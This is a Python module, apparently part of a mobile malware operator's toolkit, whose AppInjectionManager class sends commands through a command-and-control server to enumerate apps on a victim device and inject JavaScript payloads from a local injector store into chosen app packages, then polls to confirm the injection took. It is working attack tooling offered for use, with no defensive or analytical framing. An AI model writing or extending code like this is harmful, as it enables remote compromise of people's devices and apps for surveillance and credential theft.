import os
import json
import logging
import requests
import base64
from typing import Optional, Dict, Any

logger = logging.getLogger(__name__)

C2_URL = os.environ.get('C2_URL', 'http://localhost:5000')
INJECTOR_STORE = os.environ.get('INJECTOR_STORE', 'payloads/injectors')

def _encrypt_command(cmd: str) -> str:
    return base64.b64encode(cmd.encode()).decode()

def _decrypt_response(resp: str) -> str:
    return base64.b64decode(resp.encode()).decode()

class AppInjectionManager:
    def __init__(self, device_id: str):
        self.device_id = device_id
        self._load_injectors()

    def _load_injectors(self) -> list:
        if not os.path.exists(INJECTOR_STORE):
            os.makedirs(INJECTOR_STORE)
        return [f for f in os.listdir(INJECTOR_STORE) if f.endswith('.js')]

    def list_installed_apps(self) -> Optional[list]:
        payload = {
            "device_id": self.device_id,
            "command": "ListApps",
            "parameters": {}
        }
        try:
            resp = requests.post(f"{C2_URL}/api/v1/commands/push", json=payload, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'success':
                    apps = json.loads(_decrypt_response(data['data']))
                    return apps
            return None
        except Exception as e:
            logger.error(f"list_installed_apps error: {e}")
            return None

    def inject_into_app(self, package_name: str, injector_name: str) -> bool:
        if not os.path.exists(os.path.join(INJECTOR_STORE, injector_name)):
            logger.error(f"Injector {injector_name} not found")
            return False
        with open(os.path.join(INJECTOR_STORE, injector_name), 'r') as f:
            code = f.read()
        payload = {
            "device_id": self.device_id,
            "command": "InjectJS",
            "parameters": {
                "package": package_name,
                "code": _encrypt_command(code)
            }
        }
        try:
            resp = requests.post(f"{C2_URL}/api/v1/commands/push", json=payload, timeout=10)
            return resp.status_code == 200
        except Exception as e:
            logger.error(f"inject_into_app error: {e}")
            return False

    def verify_injection(self, package_name: str) -> bool:
        payload = {
            "device_id": self.device_id,
            "command": "VerifyInjection",
            "parameters": {"package": package_name}
        }
        try:
            resp = requests.post(f"{C2_URL}/api/v1/commands/push", json=payload, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data.get('status') == 'success'
            return False
        except Exception as e:
            logger.error(f"verify_injection error: {e}")
            return False

    def monitor_injection_status(self, package_name: str, timeout: int = 30) -> bool:
        import time
        start = time.time()
        while time.time() - start < timeout:
            if self.verify_injection(package_name):
                return True
            time.sleep(2)
        return False